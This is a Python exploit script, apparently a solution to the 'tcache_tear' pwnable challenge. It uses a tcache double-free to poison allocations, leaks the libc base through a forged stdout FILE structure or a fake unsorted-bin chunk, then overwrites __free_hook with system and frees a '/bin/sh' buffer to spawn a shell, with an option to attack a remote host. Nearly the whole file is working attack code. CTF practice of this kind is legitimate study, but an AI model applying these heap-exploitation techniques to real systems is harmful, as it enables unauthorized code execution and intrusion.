#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./tcache_tear_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg

b *0x400B54
b *0x400C54
b *0x400BBF

c
'''

p = start()

# ==================== EXPLOIT ====================

def choice(option: int):
    sna(b'choice :', option)


def malloc(size, data):
    choice(1)
    sna(b'Size:', size)
    sa(b'Data:', data)


def free():
    choice(2)



def info():
    choice(3)
    ru(b'Name :')

def leak_libc(fsop=False):


    if fsop:
        STDOUT_ADDR = 0x602020
        sa(b'Name:', b'A'*0x8)

        malloc(0x68, b"AAAA")
        free()
        free()

        malloc(0x68, p64(STDOUT_ADDR))
        malloc(0x68, p64(0x0))
        malloc(0x68, p8(0x60))

        STDERR_ADDR   = 0x602040
        _FLAGS      = 0xfbad2887

        fields = [
            _FLAGS,                # _flags
            0,                     # _IO_read_ptr
            STDERR_ADDR,           # _IO_read_end
            0,                     # _IO_read_base
            STDERR_ADDR,           # _IO_write_base
            STDERR_ADDR + 0x100,   # _IO_write_ptr
            0,                     # _IO_write_end
            0,                     # _IO_buf_base
            0,                     # _IO_buf_end
            0,                     # _IO_save_base
            0,                     # _IO_backup_base
            0,                     # _IO_save_end
            0,                     # _markers
            0,                     # _chain
            1,                     # _fileno (1 = STDOUT_ADDR)
        ]


        malloc(0x68, flat(*fields))

        libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ec680
        success('libc base @ %#x', libc.address)
    else:
        GBUF_ADDR = 0x602060

        sa(b'Name:', b'A'*0x8)

        malloc(0x60, b"AAAA")
        free()
        free()

        fake_chunk = flat(
            0x0, 0x20 | 1,
            0x0, 0x0, 
            0x0, 0x20 | 1
        )

        malloc(0x60, p64(GBUF_ADDR + 0x420 - 0x10))
        malloc(0x60, b"BBBB")
        malloc(0x60, fake_chunk)


        malloc(0x70, b"AAAA")
        free()
        free()

        fake_chunk = flat(
            0x0, 0x420 | 1,
            0x0, 0x0, 
            0x0, 0x0,
            0x0, GBUF_ADDR
        )

        malloc(0x70, p64(GBUF_ADDR - 0x10))
        malloc(0x70, b"BBBB")
        malloc(0x70, fake_chunk)

        free()
        info()

        leak_address = u64(rb(6).ljust(0x8, b'\0'))
        libc.address = leak_address - 0x3ebca0
        success('leak @ %#x', leak_address)
        success('libc base @ %#x', libc.address)


def get_shell():

    # Overwrite __free_hook -> system
    malloc(0x80, b"AAAA")
    free()
    free()

    malloc(0x80, p64(libc.sym.__free_hook))
    malloc(0x80, b"BBBB")
    malloc(0x80, p64(libc.sym.system))

    # Trigger __free_hook
    malloc(0x90, b'/bin/sh\0')
    free()

def exploit():

    leak_libc(fsop=True)
    get_shell()

    interactive()

if __name__ == '__main__':
    exploit()
